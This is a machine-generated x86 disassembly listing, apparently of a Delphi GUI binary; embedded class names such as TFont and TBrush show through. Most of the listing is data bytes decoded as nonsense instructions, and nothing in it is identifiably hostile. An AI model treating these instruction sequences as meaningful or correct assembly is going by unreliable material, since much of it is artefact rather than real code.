mov eax sub_424b08
call sub_4059e4
mov dl 0x1
mov eax [ r-xdata ]
call sub_40d4e0
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_405b68
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a538
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b8c0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b8c0
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_424e14
push 0x73004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi + edi * 8 ] dh
add [ eax + 0x76 ] ch
dec eax
add [ ebp - 0x1 ] dh
add [ eax ] al
push 0x76004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi - 0x1 ] dh
add [ eax ] al
push 0x78004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ecx - 0x1 ] bh
add [ eax ] al
push 0x7a004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ebx - 0x1 ] bh
add [ eax ] al
push 0x7c004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ebp - 0x1 ] bh
add [ eax ] al
push 0x7e004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi - 0x1 ] bh
add [ eax ] al
push 0x60004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ecx - 0x1 ] ah
add [ eax ] al
push 0x62004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ebx - 0x1 ] ah
add [ eax ] al
push 0x64004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ebp - 0x1 ] ah
add [ eax ] al
push 0x66004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi - 0x1 ] ah
add [ eax ] al
push 0x68004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ecx - 0x1 ] ch
add [ eax ] al
push 0x6a004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ebx - 0x1 ] ch
add [ eax ] al
push 0x6c004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ebp - 0x1 ] ch
add [ eax ] al
push 0x6e004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi - 0x1 ] ch
add [ eax ] al
push 0x50004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ecx - 0x1 ] dl
add [ eax ] al
push 0x52004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ebx - 0x1 ] dl
add [ eax ] al
push 0x54004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ebp - 0x1 ] dl
add [ eax ] al
push 0x56004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi - 0x1 ] dl
add [ eax ] al
push 0x58004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ecx - 0x1 ] bl
add [ eax ] al
push 0x5a004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ebx - 0x1 ] bl
add [ eax ] al
push 0x5c004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ebp - 0x1 ] bl
add [ eax ] al
push 0x5e004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi - 0x1 ] bl
add [ eax ] al
push 0x40004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ecx - 0x1 ] al
add [ eax ] al
push 0x42004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ebx - 0x1 ] al
add [ eax ] al
push 0x44004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ebp - 0x1 ] al
add [ eax ] al
push 0x46004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi - 0x1 ] al
add [ eax ] al
push 0x48004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ecx - 0x1 ] cl
add [ eax ] al
push 0x4a004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ebx - 0x1 ] cl
add [ eax ] al
push 0x4c004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ebp - 0x1 ] cl
add [ eax ] al
push 0x4e004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi - 0x1 ] cl
add [ eax ] al
push 0x30004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ecx ] dh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edx ] dh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ebx ] dh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi + edi * 8 ] dh
add [ eax ] al
push 0x35004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ esi ] dh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi ] dh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ eax ] bh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ecx ] bh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edx ] bh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ebx ] bh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi + edi * 8 ] bh
add [ eax ] al
push 0x3d004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ esi ] bh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi ] bh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ eax ] ah
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ecx ] ah
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edx ] ah
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ebx ] ah
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi + edi * 8 ] ah
add [ eax ] al
push 0x25004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ esi ] ah
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi ] ah
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ eax ] ch
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ecx ] ch
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4250f1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4250f8
retn
sub_425108
add [ esi ] eax
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
push 0x4251
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x51 ] ch
inc edx
add [ eax + eax ] cl
add [ eax ] al
nop
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
push ecx
inc edx
add [ eax + eax ] cl
add [ eax ] al
nop
je r-xdata
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xf004033 ] al
inc ebp
dec ecx
outsb
jbe r-xdata
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x18004033 ] al
inc ebp
dec ecx
outsb
jbe r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl sp ax
push ecx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add al ah
push ecx
inc edx
add [ ecx ] cl
jo r-xdata
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
push esp
imul esp [ ebx + 0x4f ] 0x61726570
jb r-xdata
push 0x65737261
je r-xdata
popa
jne r-xdata
jae r-xdata
inc esi
popad
insd
nop
cmp [ edx + 0x42 ] dl
add [ ecx ] al
or al 0x54
je r-xdata
je r-xdata
outsd
outsb
lea eax [ eax ]
in al 0x51
inc edx
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
push esp
push edx
inc edx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
jae r-xdata
outsb
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ eax ] ah
push ebx
inc edx
add [ edi ] al
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
push edx
inc edx
add [ ebx + 0x4252bcc0 ] cl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
push eax
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x52 ] dl
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
inc edx
add [ esi ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
push eax
push edx
popad
jb r-xdata
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0x52a4c08b
inc edx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax + 0x7004252 ] bh
jo r-xdata
outsd
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x42522890
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
pop es
jb r-xdata
insd
push edi
push 0x5657469
jo r-xdata
jo r-xdata
pop es
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
int3
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x42532490
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
inc edx
add [ gs : eax ] eax
add [ eax ] al
push 0x6c797453
shl al 0x53
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
dec esi
outsd
je r-xdata
jo r-xdata
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
add eax 0x6f4e6d70
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
jo r-xdata
push es
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
pop eax
dec esi
inc esp
outsd
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add ah bl
push ebx
inc edx
add [ edi ] al
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jae r-xdata
popad
jae r-xdata
dec ebp
push eax
outsb
insb
add [ ecx ] al
add ch bh
jae r-xdata
mov eax eax
loopne r-xdata
inc edi
jb r-xdata
jb r-xdata
inc ebx
outsd
jo r-xdata
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ esp + edi * 4 ] ah
inc ecx
add [ edi * 4 - 0x42c3ffbf ] dh
inc ecx
add [ eax - 0x44 ] dl
inc ecx
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
inc edx
add [ eax ] bl
jpe r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
jae r-xdata
dec ebp
popad
jae r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
insb
add eax 0x6f586d70
imul eax [ edx ] 0x7247540f
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
inc edx
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0x53e0c08b
inc eax
add al ch
xor eax 0x35ec0040
inc ecx
add al bl
xor eax 0x35e40040
outsb
je r-xdata
dec ebp
jb r-xdata
add [ ebx ] al
outsb
jb r-xdata
movsb [ edi ] [ esi ]
push esp
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + ecx * 8 + 0x54 ] si
inc edx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
nop
inc edi
outsd
popad
insb
dec esi
outsd
je r-xdata
add [ eax ] al
add ah ch
pop [ ecx ]
fdiv [ 0x35e40040 ]
add [ eax + 0x18004254 ] bh
insb
dec esi
outsd
or dh [ gs : eax + 0x6d ]
[ ecx + ebp * 2 + 0x540f0042 ]
jo r-xdata
test al 0x55
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + 0x54 ] si
inc edx
add [ eax - 0x70 ] ah
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
push esp
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x47ffbdac ] dh
push esp
imul esp [ ebx + 0x73 ] 0x4254a490
push ebp
inc edx
add [ eax + eax ] ah
add [ eax ] al
pop eax
sahf
jo r-xdata
push esp
inc edx
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
imul esp [ ebx + 0x73 ] 0xc08b0000
clc
push esp
inc edx
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
inc eax
add [ ebx + esi + 0x40 ] al
add [ esp + ebp * 2 - 0x42cbffbe ] bh
inc ecx
add [ edi * 4 + 0x6d000041 ] bh
inc edx
imul sp [ ebp + 0x72 ] 0x11a4
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
push esp
inc edx
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
jmp esp
jo r-xdata
add [ eax ] al
hlt
imul esp [ ebx + 0x73 ] 0xffff0001
nop
js r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x61ffbdab ] dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edx * 2 + 0x55a80042 ] al
sub_4256ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x57
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edi
inc edx
add [ eax + eax ] bl
add [ eax ] al
pop eax
push esp
inc edx
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add al bl
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi * 4 - 0x42c3ffbf ] dh
inc ecx
add [ eax ] al
jb r-xdata
inc edx
add ah bh
jae r-xdata
push ebx
inc edx
add [ eax ] bl
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add [ esp + edx * 2 ] al
push eax
outsb
lea eax [ eax ]
or al 0x57
inc edx
add [ edi ] al
add al 0x54
push eax
outsb
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 2 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
inc edx
add [ eax ] bl
add [ eax ] al
add [ eax + 0x54 ] bl
inc edx
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x34004274 ] ah
mov ebp 0xbd3c0041
inc ecx
add al cl
je r-xdata
add [ esp + esi * 2 ] al
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
push esp
adc [ eax ] al
sub al 0x74
inc edx
add [ esp + esi * 2 ] dh
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74646957
push 0x57f4c08b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add [ esi ] al
push esp
inc edx
jb r-xdata
jae r-xdata
push ebx
inc edx
add [ edi + esi * 2 ] bl
inc edx
add [ edi + esi * 2 ] ah
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
mov eax 0x4258
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
push ecx
inc edx
add [ eax ] al
jbe r-xdata
add [ ecx + edx * 2 ] al
add [ eax ] 0x0
add eax 0x73757242
push r-xdata
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
add [ edi ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
pop eax
inc edx
add [ eax ] al
nop
or al 0x58
inc edx
add [ edi ] al
push es
push esp
inc edx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
jbe r-xdata
add al 0xdc
jmp sub_41be64
dec ebp
jns r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add al dl
pop eax
inc edx
add [ eax ] bl
add [ eax ] al
in al dx
pop [ ecx ]
fdiv [ 0x35e40040 ]
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
pop ecx
inc edx
add [ ebp + 0x59 ] bh
inc edx
add [ edx + 0x1004259 ] cl
add [ eax ] al
add [ ebx + 0x7ab8cd12 ] ah
aam 0x11
sbb edx 0x0
ror [ edi + 0x60 ] 0xb2
fnstsw [ edx + 0x24004259 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x425a3cc0 ] cl
add dh cl
pop ecx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x425a ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x57ffbda6 ] ah
pop edx
inc edx
add [ eax ] ch
add [ eax ] al
add ah bl
nop
inc ecx
add al bl
xor eax 0xbdf40040
inc ecx
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ esp + edi * 4 ] ah
inc ecx
add [ edi * 4 - 0x6c8fffbf ] dh
inc edx
add [ eax - 0x44 ] dl
inc ecx
add [ esi + edi * 4 - 0x6cffffbf ] al
inc edx
add [ eax - 0x43ffbfd5 ] dl
xchg ebx eax
inc edx
add [ eax - 0x6fffbfd5 ] dl
sub eax [ eax ]
add al 0x95
inc edx
add [ eax ] cl
xchg ebp eax
inc edx
add [ eax - 0x77ffbfd5 ] dl
xchg ebp eax
inc edx
add [ eax - 0x13ffbfd5 ] dl
xchg ebp eax
inc edx
add al dh
xchg ebp eax
inc edx
add [ eax + 0x402b ] dl
xchg esi eax
inc edx
add al cl
xchg edx eax
inc edx
add [ edx * 4 - 0x6a6bffbe ] cl
inc edx
add [ eax - 0x6fffbfd5 ] dl
sub eax [ eax ]
nop
sub eax [ eax ]
nop
sub eax [ eax ]
add [ eax ] eax
std
jmp [ eax - 0x6b ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
outsd
outsb
je r-xdata
add al 0x24
retn
outsd
movsb [ edi ] gs : [ esi ]
push ebp
inc edx
add [ eax + eax ] cl
add bh bh
js r-xdata
pop eax
inc edx
add [ edi ] al
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
fcomp [ eax + 0x42 ]
hlt
jl r-xdata
push edi
inc edx
add [ eax ] dl
add [ eax ] al
inc [ eax + 0x100427c ]
add [ eax ] cl
pop eax
add [ edi * 4 - 0x42c3ffbf ] dh
inc ecx
add [ eax - 0x44 ] dl
inc ecx
add [ esi + edi * 2 + 0x7e980042 ] ch
inc edx
add ah cl
jge r-xdata
jo r-xdata
jae r-xdata
fsub st1
xchg ebp eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50030003 ] al
outsb
mov eax eax
int3
add [ ecx ] al
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + edi * 2 ] bl
inc edx
pop eax
inc edx
add [ eax - 0x70 ] ah
inc ecx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
inc edx
add [ eax + eax ] dl
add bh bh
imul esp [ ebx + 0x73 ] 0x58080004
sub_425b48
and bl [ ebx + 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x2fffbda5 ] ah
pop ebx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x3fffbda5 ] dh
pop ebx
inc edx
add [ eax + eax ] ch
add [ eax ] al
fcom [ eax + 0x35d80041 ]
inc eax
add ah dh
mov ebp 0x35e80041
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
inc eax
fwait
inc edx
add [ eax - 0x65 ] dh
inc edx
add ah ch
lahf
inc edx
add [ eax ] dh
popfd
inc edx
add [ esi + edi * 4 + 0xe0041 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
hlt
sub_425bf4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x425c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 2 + 0x42 ] dl
add [ eax + eax ] bl
add [ eax + ebx * 2 + 0x42 ] ch
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x340042a3 ] dl
mov ebp 0xbd3c0041
inc ecx
add [ eax - 0x44 ] dl
inc ecx
add [ esi + edi * 2 + 0x7e980042 ] ch
inc edx
add ah cl
jge r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
pop esp
add [ edi ] cl
push esp
dec ebp
je r-xdata
add [ esi + edi * 4 - 0x6cffffbf ] al
inc edx
add al ch
movsb [ edi ] [ esi ]
inc edx
add [ ebx + edx * 4 - 0x599fffbe ] bh
inc edx
add [ eax - 0x5a ] bh
inc edx
add [ edi ] cl
inc edx
add [ eax ] cl
xchg ebp eax
inc edx
add [ eax + 0x780042a7 ] bl
test al 0x42
add [ esp + ebp * 4 - 0x6a13ffbe ] ah
inc edx
add [ eax - 0x6bffbd53 ] dl
lodsd [ esi ]
inc edx
add ah ch
scasb [ edi ]
inc edx
add ah bl
mov [ 0xffffffff950c0042 ] eax
inc edx
add [ ebx + ebp * 4 ] dh
inc edx
add ah bh
cmpsd [ esi ] [ edi ]
inc edx
add al bh
stosd [ edi ]
inc edx
add [ eax - 0x4f ] al
inc edx
add ah al
mov cl 0x42
add [ ecx ] cl
push esp
dec ebp
je r-xdata
imul bp [ ebp + 0x49 ] 0x616d
nop
pushfd
pop ebp
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
pop esi
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esi
inc edx
add [ eax ] dh
add [ eax ] al
add al dh
pop ecx
inc edx
add al bl
xor eax 0xbdf40040
inc ecx
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ esp ] ah
inc edx
add [ edi * 4 - 0x6c8fffbf ] dh
inc edx
add [ esp + 0x42 ] dl
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
add al bl
xor eax 0x35e40040
imul bp [ ebp + 0x43 ] 0x6e61
jbe r-xdata
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
imul bp [ ebp - 0x75 ] 0x10c0
pop esi
inc edx
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
je r-xdata
push ebx
push 0x64657261
dec ecx
insd
popad
lea eax [ bx + si ]
cmp al 0x5d
call 0xffffffffec429cfe
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ eax + 0xc00402b ] dl
push esp
jae r-xdata
imul bp [ ebp - 0x64 ] 0x425d
add [ edx + ebx * 2 + 0x42 ] dh
or [ edi + 0x72 ] al
popad
jo r-xdata
xor eax 0x33280040
pop esp
inc edx
add [ edi ] al
andps xmm1 [ ebp + 0x65 ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5f ] bl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx * 2 + 0x42 ] cl
add [ eax + eax ] bh
add [ eax ] al
imul esp [ ebx + 0x73 ] 0x5e7c0000
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7400425e ] al
add [ eax ] al
add [ eax - 0x27ffbda4 ] dl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add al dh
mov ch 0x42
add [ esi + esi * 4 + 0x42 ] cl
